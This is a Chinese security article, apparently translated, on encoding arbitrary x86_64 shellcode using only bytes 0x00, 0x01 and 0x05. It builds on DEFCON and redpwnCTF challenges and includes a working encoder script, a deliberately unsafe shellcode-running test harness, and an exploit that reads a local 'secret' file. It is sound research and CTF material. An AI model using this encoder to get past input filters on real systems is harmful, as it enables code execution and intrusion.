# 仅用三种字符实现 x86_64 架构的任意 shellcode

阅读量 **568849**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-11-04 16:30:32

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 前言

今年(2021) DEFCON 决赛出了一道有意思的 KoH 题(shoow-your-shell)，用 shellcode 读取 secret
文件内容并输出，比谁用的字符更少，字符数相同时比谁的长度更短。

有队伍仅用 3 个字节就输出了 secret 的内容，但这应该是出题的失误，利用 read 系统调用二次读入的字节也应该属于 payload
的一部分，全部加起来再算分更合理。如果在运行 shellcode 之前，将所有寄存器的值都设置为 0xdeadbeefdeadbeef 则可以避免此情况。

有队伍仅用 3 种字符就实现 ROP 输出了 secret 的内容，非常的强大。如果二进制开启了 PIE，是否还能仅用 3 种字符就实现输出 secret
内容的 shellcode 呢？

在 redpwnCTF 2021 中有一道叫 gelcode-2 的 shellcode 题，仅用小于等于 0x05 的字符就实现读取 flag 的
shellcode。

其实，仅用 0x00、0x01、0x05 这三种字符，即可实现 x86_64 架构的任意 shellcode。

## 三种字符 shellcode 的基本原理

###  将 shellcode 进行分段

每段指令不超过 4 个字节(如果多出来的字节是 0x00、0x01、0x05 也可以接受)，小于 4 字节的可以用 nop 等无影响的指令进行补充。

在编写时 shellcode 尽量不要使用 rax 寄存器(因为构造 shellcode 时要用到)，对于 syscall 必须用到 rax
的则需要放在同一组，以 exit(0) 系统调用为例：

    
    
    6a 3c 6a 00    push 60; push 0;            # 第 1 组
    5f 58 0f 05    pop rdi; pop rax; syscall;  # 第 2 组
    

大于 4 字节的指令(且多出来的字节不是 0x00、0x01、0x05 的)尽量换种写法，对于实在换不了的，下文另外讨论。

###  add eax, 0xXXXXXXXX 指令

add eax, 0xXXXXXXXX 指令是以 0x05 开头，紧跟着 4 字节的操作数(小端序)，举例：

    
    
    05 00 05 00 01    add eax, 0x01000500
    

在知道当前 eax 值的情况下，就可以通过 N 条 add eax, 0xXXXXXXXX 指令，将 eax 加成任意想要的值。

为了减少指令的数量，4 个字节可以并行地做加法，相差大于等于 5 的加 5，相差大于等于 1 的加 1，剩下相等的加 0。具体算法如下：

    
    
    def next_step(value):
        """ 每个字节每次加 5、1 或 0 """
        n = 0
        for i in range(4):
            if (value >> (i * 8)) & 0xff >= 5:
                n |= (5 << (i * 8))
            elif (value >> (i * 8)) & 0xff >= 1:
                n |= (1 << (i * 8))
        return n
    
    def add_eax(value):
        """ 将 eax 加上指定的值 """
        payload = b''
        while value > 0:
            n = next_step(value)
            payload += b'\x05' + p32(n)
            value -= n
        return payload
    

###  add [rip], eax 指令

add [rip], eax 指令仅含有 0x00、0x01、0x05 三种字符，并且可以将接下来 4 字节的指令加上 eax 的值，从而实现任意
shellcode 的构造。

    
    
    01 05 00 00 00 00    add [rip], eax  # 将 eax 的值加到接下来 4 字节的指令中
    00 00 00 00                          # 4 字节的占位指令(加上 eax 的值就是需要构造的目标指令)
    

当执行完 add [rip], eax 指令之后，下一条执行的指令就是 eax 加上占位数值所代表的指令。

除了用 4 字节的 0x00 占位外，还可以使用 0x01 和 0x05 来占位，这样可以使得整体 shellcode 的长度更短。

上文说到可以利用 0x00、0x01、0x05 三种字符构造出任意的 eax 值，也就是说，可以构造出任意 4 字节的目标指令。

完整的转换算法如下：

    
    
    def asm_015(shellcode):
        """ 将 shellcode 转换成 0x00、0x01、0x05 三种字符 """
        # 不足 4 字节的目标指令补充 nop 指令
        if len(shellcode) < 4:
            shellcode = shellcode.ljust(4, b'\x90')
        # 特殊处理超过 4 字节且含有其他字符的目标指令
        if len(shellcode) > 4:
            for c in shellcode[4:]:
                if c not in (0, 1, 5):
                    return asm_long_015(shellcode)
        # 当前 eax 距离目标指令的差值
        global current_eax
        eax_offset = u32(shellcode[:4]) - current_eax
        if eax_offset < 0:
            eax_offset += 0x100000000
        # 预留第一步的值，以减少 shellcode 的总体长度
        reserved = next_step(eax_offset)
        eax_offset -= reserved
        # 设置 eax 为目标指令
        payload = add_eax(eax_offset)
        current_eax = (current_eax + eax_offset) & 0xffffffff
        # 将 eax 加到目标指令
        payload += b'\x01\x05\x00\x00\x00\x00'  # add [rip], eax
        # 目标指令预留的值
        payload += p32(reserved)
        # 目标指令超出 4 字节的部分(全是 0x00、0x01、0x05 之一)
        payload += shellcode[4:]
        return payload
    

## 处理大于 4 字节的指令

当 shellcode 某组指令必须大于 4 字节时，如果多出的字节全是 0x00、0x01、0x05
三种字符之一，那直接加在后面即可。如果多出的字节不全是 0x00、0x01、0x05 三种字符之一，就需要特殊处理了。

一种解决方案是：将完整的指令写在某处 rwx 的内存，利用 call 指令跳过去执行，在最后加一个 ret 指令返回。

利用下面的模式就可以将 shellcode 完整地写在 rbp 指向的内存：

    
    
    66 bb 34 12    mov bx, 0x1234       # 第 1 组将 bx 设置为 shellcode 第 1、2 字节
    66 89 5d 00    mov [rbp + 0x0], bx  # 第 2 组将 bx 写入 rbp 指向的位置(偏移为 0)
    66 bb 78 56    mov bx, 0x5678       # 第 3 组将 bx 设置为 shellcode 第 3、4 字节
    66 89 5d 02    mov [rbp + 0x2], bx  # 第 4 组将 bx 写入 rbp 指向的位置(偏移为 2)
    

如果指令长度超过 0x80，就需要稍微调整一下此模式。但是将指令拆成 4 字节一组可以使整体 shellcode 长度更短，因此没必要这样做。

完整的转换算法如下：

    
    
    def asm_long_015(shellcode):
        """ 将超长的 shellcode 转换成 0x00、0x01、0x05 三种字符(会破坏 rbp 寄存器) """
        # 添加 ret 指令，并补充为 2 的整数倍长度
        shellcode += b'\xC3'
        if len(shellcode) % 2 == 1:
            shellcode += b'\x90'
        # 暂不支持大于等于 0x80 字节的超长指令，尽量将指令拆成 4 字节一组以减少 shellcode 长度
        assert len(shellcode) < 0x80
        # 将 rbx 入栈，往 rbp 处构造出超长 shellcode
        payload = asm_015(b'\x53\x48\x8D\x2D\x00\x00\x00\x00')  # push rbx; lea rbp, [rip]
        for i in range(0, len(shellcode), 2):
            payload += asm_015(b'\x66\xBB' + shellcode[i:i+2])  # mov bx, 0xXXXX
            payload += asm_015(b'\x66\x89\x5D' + bytes([i]))    # mov [rbp + i], bx
        # 将 rbx 出栈，调用 rbp 处的超长 shellcode
        payload += asm_015(b'\x5B\xFF\xD5\x90')                 # pop rbx; call rbp; nop
        return payload
    

## 处理 syscall 的返回值

调用 syscall 之后，返回值会写入 rax 寄存器，这会影响到后续 shellcode 的构造。

如果事先知道 syscall 会返回什么值，那只要更新当前 eax 的值即可。

如果不知道 syscall 会返回什么值，那就需要在 syscall 那组指令中设置好 eax 的值，举例：

    
    
    58                pop rax
    0f 05             syscall
    b8 00 00 00 00    mov eax, 0x0
    

前 4 个字节可以通过上文说到的方式构造出来，后面跟着 4 个 0x00，也可以换成 0x01 或 0x05(某些情况下可以减少整体 shellcode
的长度)。

## 测试 shellcode 的程序

这是本文测试 shellcode 的二进制程序源代码，用来验证 0x00、0x01、0x05 三个字符可以组成任意的 shellcode。

  * 首先 mmap 随机的地址，使 shellcode 运行时 rip 寄存器的值是未知的。
  * 然后将所有寄存器的值设置为 0xdeadbeefdeadbeef，使 shellcode 不依赖寄存器的初始值。
  * 最后编译时开启 PIE，使 shellcode 不依赖程序的 gadget。

    
    
    #include <assert.h>
    #include <fcntl.h>
    #include <stdio.h>
    #include <string.h>
    #include <sys/mman.h>
    #include <sys/stat.h>
    #include <sys/types.h>
    #include <unistd.h>
    
    char init_code[] = {0x48, 0xB8, 0xEF, 0xBE, 0xAD, 0xDE, 0xEF, 0xBE, 0xAD, 0xDE, 0x48, 0xBB, 0xEF, 0xBE, 0xAD, 0xDE,
                        0xEF, 0xBE, 0xAD, 0xDE, 0x48, 0xB9, 0xEF, 0xBE, 0xAD, 0xDE, 0xEF, 0xBE, 0xAD, 0xDE, 0x48, 0xBA,
                        0xEF, 0xBE, 0xAD, 0xDE, 0xEF, 0xBE, 0xAD, 0xDE, 0x48, 0xBF, 0xEF, 0xBE, 0xAD, 0xDE, 0xEF, 0xBE,
                        0xAD, 0xDE, 0x48, 0xBE, 0xEF, 0xBE, 0xAD, 0xDE, 0xEF, 0xBE, 0xAD, 0xDE, 0x49, 0xB8, 0xEF, 0xBE,
                        0xAD, 0xDE, 0xEF, 0xBE, 0xAD, 0xDE, 0x49, 0xB9, 0xEF, 0xBE, 0xAD, 0xDE, 0xEF, 0xBE, 0xAD, 0xDE,
                        0x49, 0xBA, 0xEF, 0xBE, 0xAD, 0xDE, 0xEF, 0xBE, 0xAD, 0xDE, 0x49, 0xBB, 0xEF, 0xBE, 0xAD, 0xDE,
                        0xEF, 0xBE, 0xAD, 0xDE, 0x49, 0xBC, 0xEF, 0xBE, 0xAD, 0xDE, 0xEF, 0xBE, 0xAD, 0xDE, 0x49, 0xBD,
                        0xEF, 0xBE, 0xAD, 0xDE, 0xEF, 0xBE, 0xAD, 0xDE, 0x49, 0xBE, 0xEF, 0xBE, 0xAD, 0xDE, 0xEF, 0xBE,
                        0xAD, 0xDE, 0x49, 0xBF, 0xEF, 0xBE, 0xAD, 0xDE, 0xEF, 0xBE, 0xAD, 0xDE, 0x48, 0xBD, 0xEF, 0xBE,
                        0xAD, 0xDE, 0xEF, 0xBE, 0xAD, 0xDE, 0x48, 0xBC, 0xEF, 0xBE, 0xAD, 0xDE, 0xEF, 0xBE, 0xAD, 0xDE};
    
    int main() {
      setvbuf(stdin, NULL, _IONBF, 0);
      setvbuf(stdout, NULL, _IONBF, 0);
      setvbuf(stderr, NULL, _IONBF, 0);
    
      int ufd = open("/dev/urandom", O_RDONLY);
      assert(ufd != -1);
      void *addr = 0;
      read(ufd, &addr, 8);
      close(ufd);
      assert(addr > 0);
      *((unsigned long *)&addr) &= 0xffffff000;
    
      assert(mmap(addr, 0x100000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) == addr);
      memcpy(addr, init_code, sizeof(init_code));
    
      unsigned int length = 0;
      printf("shellcode length: ");
      assert(scanf("%u", &length) == 1);
    
      unsigned int n = 0;
      void *p = addr + sizeof(init_code);
      while (length > 0) {
        ssize_t n = read(0, p, length);
        assert(n > 0);
        p += n;
        length -= n;
      }
    
      return ((int (*)(void))addr)();
    }
    
    
    
    gcc -pie -o test_shellcode test_shellcode.c
    

## 完整的 shellcode 生成脚本

将 shellcode 适当地分组，就可以用脚本直接转换成 0x00、0x01、0x05 三种字符。  
备注：适当调整 shellcode 的顺序，可以获得更短的 shellcode 长度。

    
    
    #!/usr/bin/env python3
    
    from pwn import *
    
    current_eax = 0xdeadbeef
    
    def next_step(value):
        """ 每个字节每次加 5、1 或 0 """
        n = 0
        for i in range(4):
            if (value >> (i * 8)) & 0xff >= 5:
                n |= (5 << (i * 8))
            elif (value >> (i * 8)) & 0xff >= 1:
                n |= (1 << (i * 8))
        return n
    
    def add_eax(value):
        """ 将 eax 加上指定的值 """
        payload = b''
        while value > 0:
            n = next_step(value)
            payload += b'\x05' + p32(n)
            value -= n
        return payload
    
    def asm_015(shellcode):
        """ 将 shellcode 转换成 0x00、0x01、0x05 三种字符 """
        # 不足 4 字节的目标指令补充 nop 指令
        if len(shellcode) < 4:
            shellcode = shellcode.ljust(4, b'\x90')
        # 特殊处理超过 4 字节且含有其他字符的目标指令
        if len(shellcode) > 4:
            for c in shellcode[4:]:
                if c not in (0, 1, 5):
                    return asm_long_015(shellcode)
        # 当前 eax 距离目标指令的差值
        global current_eax
        eax_offset = u32(shellcode[:4]) - current_eax
        if eax_offset < 0:
            eax_offset += 0x100000000
        # 预留第一步的值，以减少 shellcode 的总体长度
        reserved = next_step(eax_offset)
        eax_offset -= reserved
        # 设置 eax 为目标指令
        payload = add_eax(eax_offset)
        current_eax = (current_eax + eax_offset) & 0xffffffff
        # 将 eax 加到目标指令
        payload += b'\x01\x05\x00\x00\x00\x00'  # add [rip], eax
        # 目标指令预留的值
        payload += p32(reserved)
        # 目标指令超出 4 字节的部分(全是 0x00、0x01、0x05 之一)
        payload += shellcode[4:]
        return payload
    
    def asm_long_015(shellcode):
        """ 将超长的 shellcode 转换成 0x00、0x01、0x05 三种字符(会破坏 rbp 寄存器) """
        # 添加 ret 指令，并补充为 2 的整数倍长度
        shellcode += b'\xC3'
        if len(shellcode) % 2 == 1:
            shellcode += b'\x90'
        # 暂不支持大于等于 0x80 字节的超长指令，尽量将指令拆成 4 字节一组以减少 shellcode 长度
        assert len(shellcode) < 0x80
        # 将 rbx 入栈，往 rbp 处构造出超长 shellcode
        payload = asm_015(b'\x53\x48\x8D\x2D\x00\x00\x00\x00')  # push rbx; lea rbp, [rip]
        for i in range(0, len(shellcode), 2):
            payload += asm_015(b'\x66\xBB' + shellcode[i:i+2])  # mov bx, 0xXXXX
            payload += asm_015(b'\x66\x89\x5D' + bytes([i]))    # mov [rbp + i], bx
        # 将 rbx 出栈，调用 rbp 处的超长 shellcode
        payload += asm_015(b'\x5B\xFF\xD5\x90')                 # pop rbx; call rbp; nop
        return payload
    
    def exploit(r):
        # 修复栈
        payload = asm_015(asm('lea  rsp, [rip]'))
        payload += asm_015(asm('and  rsp, 0xfffffffffffffff0'))
    
        # secret 文件路径
        payload += asm_015(asm('mov  bx, 0x0000'))
        payload += asm_015(asm('shl  rbx, 16'))
        payload += asm_015(asm('mov  bx, 0x7465'))
        payload += asm_015(asm('shl  rbx, 16'))
        payload += asm_015(asm('mov  bx, 0x7263'))
        payload += asm_015(asm('shl  rbx, 16'))
        payload += asm_015(asm('mov  bx, 0x6573'))
    
        # int open(const char *pathname, int flags)
        payload += asm_015(asm('push rbx; mov  rdi, rsp'))      # pathname
        payload += asm_015(asm('push 2; push 0'))               # sys_open, flags
        payload += asm_015(asm('pop rsi; pop rax; syscall'))
        global current_eax
        current_eax = 3     # 返回值为3，修正当前 eax
    
        # ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count)
        payload += asm_015(asm('push 0x7f; pop r10'))           # count
        payload += asm_015(asm('push 40; push 0'))              # sys_sendfile, offset
        payload += asm_015(asm('push 3; push 1'))               # in_fd, out_fd
        payload += asm_015(asm('pop rdi; pop rsi; pop rdx; nop'))
        payload += asm_015(asm('pop rax; syscall; mov eax, 0')) # 因为 flag 长度未知，因此将 eax 置 0
        current_eax = 0     # 修正当前 eax
    
        # 超长 shellcode 测试：预期正常调用 getuid()、getgid() 并正常返回
        payload += asm_015(asm('mov rax, 102; syscall; mov rax, 104; syscall; mov eax, 0'))
        current_eax = 0     # 修正当前 eax
    
        # void _exit(int status)
        payload += asm_015(asm('push 60; push 0'))              # sys_exit, status
        payload += asm_015(asm('pop rdi; pop rax; syscall'))
    
        # 验证 shellcode
        log.info('payload %s, length: %d', set(payload), len(payload))
        r.sendlineafter(b'shellcode length: ', str(len(payload)).encode('utf8'))
        pause()
        r.send(payload)
    
        # 预期输出 secret 文件内存，并正常退出
        print(r.recvallS())
        r.close()
    
    
    def main():
        context.clear(arch='amd64', os='linux')
        r = process('./test_shellcode')
        exploit(r)
    
    if __name__ == '__main__':
        main()
    

## 利用 strace 调试 syscall 的小技巧

在利用脚本发送 payload 前先 pause()，然后在另一个终端执行 strace 命令，回到 pause() 的终端按任意键继续，然后在
strace 的终端就能直观地看到是否按预期调用 syscall 了：

    
    
    $ strace -p `pidof test_shellcode`
    strace: Process 22404 attached
    read(0, "\5\5\5\5\5\5\5\5\5\5\5\5\5\5\5\5\5\5\5\5\5\5\5\5\5\5\5\5\5\1\5\5"..., 10046) = 10046
    open("secret", O_RDONLY)                = 3
    sendfile(1, 3, NULL, 127)               = 56
    getuid()                                = 0
    getgid()                                = 0
    exit(0)                                 = ?
    +++ exited with 0 +++
    

## 参考

  *     1. [redpwnCTF 2021 – gelcode-2 (pwn)](https://activities.tjhsst.edu/csc/writeups/redpwnctf-2021-gelcode)
  *     1. [DEFCON 29 FINAL shooow-your-shell 总结](https://paper.seebug.org/1673/)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **loop** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/256530](/post/id/256530)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [shellcode](/tag/shellcode)
  * [shoow-your-shell](/tag/shoow-your-shell)
  * [KoH](/tag/KoH)

 **+1** __6赞

 __收藏

![](https://p3.ssl.qhimg.com/t010857340ce46bb672.jpg) loop

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

